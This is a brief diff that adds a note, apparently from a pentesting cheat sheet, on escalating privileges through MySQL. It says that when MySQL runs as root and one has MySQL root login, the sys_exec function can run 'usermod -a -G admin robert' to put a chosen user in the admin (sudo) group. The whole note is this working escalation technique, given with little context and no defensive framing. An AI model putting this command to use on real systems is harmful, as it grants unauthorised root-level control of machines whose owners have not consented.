@@ -1,0 +1,9 @@
+if you can login as root in mysql and mysql is running as root
+
+
+then we can assing sudo permission on any user through the mysql...
+
+select sys_exec('usermod -a -G admin robert');   
+
+
+where robert and admin are user 
